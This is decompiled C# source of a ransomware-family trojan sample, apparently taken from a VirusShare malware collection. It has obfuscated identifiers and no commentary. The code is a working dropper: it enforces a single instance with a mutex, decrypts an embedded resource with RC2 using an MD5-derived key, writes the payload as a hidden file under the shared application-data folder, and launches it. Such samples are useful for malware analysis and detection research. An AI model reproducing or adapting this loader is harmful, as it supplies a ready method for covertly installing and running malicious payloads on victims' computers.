// Decompiled with JetBrains decompiler
// Type: .
// Assembly: General-Product, Version=1.4.9.1773, Culture=neutral, PublicKeyToken=null
// MVID: 558625B7-E086-47D6-A8DB-CA45241B7C09
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a6de554310e490c7c0515510f00e3e7882efc6cd.exe

using \u0010;
using \u0082\u000F;
using \u0084;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace \u0010
{
  internal sealed class \u0091\u008C\u0006
  {
    private static string \u0001 = \u0004.\u0090\u0002(120);
    private static Mutex \u0002;

    [STAThread]
    public static void \u008D\u000F()
    {
      \u0091\u008C\u0006.\u0092\u008C\u0006(\u0091\u008C\u0006.\u0001);
      \u0091\u008C\u0006.\u0093\u008C\u0006();
    }

    public static void \u0092\u008C\u0006([In] string obj0)
    {
      try
      {
        Mutex.OpenExisting(obj0);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0091\u008C\u0006.\u0002 = new Mutex(false, obj0);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0093\u008C\u0006()
    {
      ResourceManager resourceManager = new ResourceManager(\u0004.\u0090\u0002(177), Assembly.GetExecutingAssembly());
      string str = \u0084\u000F.\u008B\u000F().FileSystem.SpecialDirectories.AllUsersApplicationData + Encoding.UTF8.GetString(Convert.FromBase64String(\u0004.\u0090\u0002(186)));
      if (File.Exists(str))
        File.Delete(str);
      byte[] bytes = \u0091\u008C\u0006.\u0094\u008C\u0006(Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(\u0004.\u0090\u0002(211)))), Conversions.ToString(resourceManager.GetObject(\u0004.\u0090\u0002(228))));
      File.WriteAllBytes(str, bytes);
      File.SetAttributes(str, FileAttributes.Hidden);
      Process.Start(str);
      ProjectData.EndApp();
    }

    public static byte[] \u0094\u008C\u0006([In] byte[] obj0, [In] string obj1)
    {
      RC2CryptoServiceProvider cryptoServiceProvider = new RC2CryptoServiceProvider();
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(obj1));
      cryptoServiceProvider.Key = hash;
      cryptoServiceProvider.Mode = CipherMode.ECB;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
      byte[] inputBuffer = obj0;
      return decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
  }
}
